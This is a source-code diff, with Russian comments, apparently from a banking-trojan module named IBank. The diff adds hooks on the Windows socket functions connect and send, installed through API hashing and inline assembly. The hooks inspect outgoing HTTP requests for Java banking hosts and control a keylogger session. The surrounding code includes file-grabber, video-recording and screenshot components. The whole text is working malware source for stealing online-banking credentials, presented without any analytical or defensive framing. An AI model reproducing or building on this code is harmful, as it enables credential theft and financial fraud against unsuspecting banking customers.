@@ -18,12 +18,14 @@
 #include "BotClasses.h"
 #include "BotHTTP.h"
 #include "Loader.h"
-//#include "IBankExport.h"
 #include "FileGrabber.h"
 #include "Utils.h"
 #include "VideoRecorder.h"
+#include "BotHTTP.h"
+#include "JavaConfig.h"
 
 #include "Modules.h"
+
 
 
 //---------------------------------------------------------------------------
@@ -69,10 +71,13 @@ namespace IBank
 
 
 	// Определяем типы для установки хуков
-	typedef int (WINAPI *PConnect)(SOCKET s, const struct sockaddr *name, int namelen);
+	typedef int (WINAPI *TConnect)(SOCKET s, const struct sockaddr *name, int namelen);
+	typedef int (WINAPI *Tsend)(SOCKET s, char* buf, int len, int flags);
+
 
 	// Переменные для хранения казателей на реальные функции
-	PConnect Real_Connect;
+	TConnect Real_Connect;
+	Tsend    Real_send;
 
     // Глобальные переменные системы
 	PKeyLogSystem System = NULL;
@@ -151,8 +156,60 @@ namespace IBank
 		// Идёт запрос на сервер, закрываем систему.
 		KeyLogger::CloseSession();
 
-    	return Real_Connect(s, name, namelen);
-    }
+		return Real_Connect(s, name, namelen);
+	}
+	//-----------------------------------------------------------------------
+
+#ifdef JAVS_PATCHERH
+	void CheckHTTPRequest(char *buf, int len)
+	{
+		// При начале записи в сокет закрываем систему и отправляем данные
+		const static DWORD GetHash  = 0x78B5102B /* GET / */;
+		const static DWORD PostHash = 0xFA7512AB /* POST / */;
+
+        if (!buf || len < 6) return;
+
+		string s;
+		s.Copy(buf, 0, 10);
+		IBDBG("IBank", "------------- Request %s", s.t_str());
+
+
+
+
+		if (AnsiStr::Hash(buf, 5, false) != GetHash &&
+			AnsiStr::Hash(buf, 6, false) != PostHash)
+			return;
+
+		// Определяем имя хоста
+		PCHAR Host = HTTPParser::GetHeaderValue(buf, ParamHost);
+		if (Host)
+		{
+        	IBDBG("IBankW", "------------- Хост %s", Host);
+
+
+			if (!IsJavaHost(Host))
+            	KeyLogger::CloseSession();
+
+			STR::Free(Host);
+		}
+	}
+#endif
+	//-----------------------------------------------------------------------
+
+	int WINAPI Hook_send(SOCKET s, char* buf, int len, int flags)
+	{
+		if (System)
+		{
+			// Идёт запрос на сервер, закрываем систему.
+			#ifdef JAVS_PATCHERH
+				CheckHTTPRequest(buf, len);
+			#else
+				KeyLogger::CloseSession();
+			#endif
+		}
+
+		return Real_send(s, buf, len, flags);
+	}
 	//-----------------------------------------------------------------------
 
 	void MakeScreenShot()
@@ -190,7 +247,7 @@ namespace IBank
 	void SetHooks()
 	{
 		// Устанавливаем треуемые хуки
-		IBDBG( "IBank", "Ставим хуки для %s", System->Name );
+//		IBDBG( "IBank", "Ставим хуки для %s", System->Name );
 
 		// Ставим хук на подключение к серверу, для определения момента закрыти
 		// системы
@@ -199,6 +256,11 @@ namespace IBank
 			__asm mov [Real_Connect], eax
 		}
 
+
+//		if ( HookApi( 4, 0xE797764 /* send */, &Hook_send ) )
+//		{
+//			__asm mov [Real_send], eax
+//		}
 		//KeyLogger::ConnectEventHandler( KLE_SHOW_WND, ShowWindowIBank );
     }
 
@@ -551,10 +613,10 @@ void RegisterIBankSystem(DWORD hashApp)
 
 
 	// Для тестов
-	#ifdef AGENTFULLTEST
-		___RegisterIBankSystem(0);
-		return;
-	#endif
+//	#ifdef AGENTFULLTEST
+//		___RegisterIBankSystem(0);
+//		return;
+//	#endif
 
 
 
